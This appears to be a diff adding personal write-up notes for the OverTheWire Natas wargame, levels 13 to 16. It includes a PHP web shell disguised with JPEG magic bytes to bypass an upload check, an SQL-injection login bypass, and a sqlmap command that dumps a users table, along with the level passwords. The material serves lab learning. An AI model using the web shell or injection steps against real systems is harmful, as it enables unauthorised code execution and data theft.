@@ -242,3 +242,92 @@ jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 
 ### natas13
 
+We are met with the same page but with `For security reasons, we now only accept image files!`
+
+We check the source code and notice that exif_imagetype is called. A built in PHP function that checks the image exif info. We know this info as the magic byte. 
+
+```php
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?> 
+```
+
+ We can use [wikiedida](https://en.wikipedia.org/wiki/List_of_file_signatures) to find the file signature for jpeg and export to a file. Because the magic bytes are in hex, we use xxd to convert the magic bytes for hex to ascii.
+
+We then add our trust php oneliner to get remote code exectuion.
+
+```bash
+echo "FF D8 FF DB" | xxd -r -p >> attack.php
+echo "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>" >> attack.php
+file attack.php 
+attack.php: JPEG image data
+```
+
+We see that the system now sees that as a jpg file.
+
+We upload the file, change the request to change the ext to php and we have RCE!
+
+![image-20200913111101732](C:\Git\Overthewire\Natas\natas13.1.png)
+
+```
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
+
+### natas14
+
+We are met with a log in screen with a user name and password.
+
+Checking the source code, we see it uses a backend of SQL.
+
+I personally use zap fuzzer just to do a blanket SQL Auth Inject attack.
+
+[Wordlist can be found here.](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
+
+How to fuzz with zap can be found here.
+
+![image-20200913111654652](C:\Git\Overthewire\Natas\natas14.0)
+
+![image-20200913111731845](C:\Git\Overthewire\Natas\natas14.1)
+
+We check the various lengths of responses and see we have a odd 991 byte responce. It returns login Successful!
+
+```
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+
+### natas15
+
+Blind SQL. Not great at this at the point. After about an hour of trouble shooting[, I had to revert to using a walk though.](https://medium.com/hacker-toolbelt/natas-15-sql-injection-with-sqlmap-66cb4f89e3f7)
+
+```bash
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --string="This user exists" --auth-type=Basic --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" --data "username=natas16" --level=5 --risk=3 -D natas15 -T users -C username,password --dump
+```
+
+Long Story Short, you feed SQLMap the basicauth, the users (which you find out), and some other stuff.
+
+```
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+### natas16
+
